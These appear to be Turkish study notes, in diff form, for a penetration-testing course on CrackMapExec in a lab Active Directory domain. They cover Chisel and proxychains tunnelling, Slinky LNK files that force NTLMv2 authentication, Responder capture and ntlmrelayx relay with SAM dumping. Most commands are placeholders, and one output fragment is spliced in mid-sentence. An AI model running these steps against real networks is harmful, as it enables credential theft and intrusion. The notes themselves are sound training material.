+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'netlogon', 'sysvol']
+SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
+['ico', 'lnk']
+SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
+SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
+/tmp/cme_spider_plus
+```
+
+Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
+
+
+### Kullanıcının Kullanabileceği Dosyaları Listeleme
+
+{{CODE_BLOCK_94}}
+
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+{{CODE_BLOCK_95}}
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
 Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
